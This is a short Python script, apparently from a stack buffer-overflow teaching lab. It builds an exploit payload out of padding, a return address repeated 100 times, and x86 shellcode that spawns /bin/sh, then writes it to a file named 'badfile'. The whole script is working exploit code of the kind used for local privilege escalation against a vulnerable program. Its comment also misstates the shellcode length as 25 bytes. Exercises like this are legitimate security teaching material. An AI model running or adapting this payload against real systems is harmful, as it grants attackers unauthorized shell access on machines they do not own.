#!/usr/bin/env python3

import struct
import sys

# Shellcode to spawn /bin/sh (25 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    b"\x0b\xcd\x80"
)



# Usage: ./create_shellcode3.py <return_address_hex> [padding_bytes]
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <return_address_hex> [padding_bytes]")
    print("Example: ./create_shellcode3.py 0xffffc8a0 40")
    sys.exit(1)
try:
    ret_addr_int = int(sys.argv[1], 16)
except ValueError:
    print("Invalid return address. Use hex format, e.g., 0xffffc8a0")
    sys.exit(1)
ret_addr = struct.pack('<I', ret_addr_int)

# Optional: number of padding bytes at the beginning
padding_bytes = int(sys.argv[2]) if len(sys.argv) > 2 else 0



REPEAT_COUNT = 100
payload = b"A" * padding_bytes + ret_addr * REPEAT_COUNT


print("Hex payload:")
print(payload.hex())


# Add shellcode
payload += shellcode


# Ensure the payload is exactly 517 bytes
# if len(payload) < 517:
#     payload += b"C" * (517 - len(payload))
# elif len(payload) > 517:
#     payload = payload[:517]

# Write the payload to 'badfile'
with open("badfile", "wb") as f:
    f.write(payload)

print(f"Payload size: {len(payload)} bytes")
print(f"Return address repeated {REPEAT_COUNT} times")
print("Exploit written to 'badfile'")
